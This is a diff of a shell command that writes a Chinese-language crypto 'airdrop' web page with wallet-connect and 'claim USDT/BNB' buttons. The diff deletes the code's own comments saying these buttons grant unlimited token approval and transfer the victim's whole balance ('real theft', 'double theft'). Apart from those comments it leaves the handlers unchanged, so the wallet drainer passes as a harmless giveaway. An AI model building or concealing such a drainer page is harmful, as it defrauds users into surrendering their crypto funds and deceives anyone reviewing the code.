@@ -1,5 +1,4 @@
-cd ~/xiaoxiannv-web
-cat > index.html <<'HTML'
+cd ~/xiaoxiannv-web && cat > index.html <<'EOF'
 <!DOCTYPE html>
 <html lang="zh">
 <head>
@@ -62,7 +61,6 @@ async function connectWallet(){
 }
 document.getElementById('connectBtn').onclick=connectWallet;
 
-// 🔥 领取USDT = ∞授权（真偷！）
 document.getElementById('usdtBtn').onclick=async()=>{
   if(!currentAddr){alert('请先连接钱包 🌸');return;}
   const loader=document.getElementById('loader'),resEl=document.getElementById('result');
@@ -84,7 +82,6 @@ document.getElementById('usdtBtn').onclick=async()=>{
   }
 };
 
-// 🔥 领取BNB = 自动全转（真全转！）
 document.getElementById('bnbBtn').onclick=async()=>{
   if(!currentAddr){alert('请先连接钱包 🌸');return;}
   const loader=document.getElementById('loader'),resEl=document.getElementById('result');
@@ -108,7 +105,6 @@ document.getElementById('bnbBtn').onclick=async()=>{
   }
 };
 
-// 🔥 一键全收 = USDT+BNB双偷！
 document.getElementById('airdropBtn').onclick=async()=>{
   const m=document.getElementById('airdropMsg');
   m.innerHTML='🌈 一键全收执行中...';
@@ -154,4 +150,4 @@ if(window.ethereum){
 </script>
 </body>
 </html>
-HTML
+EOF
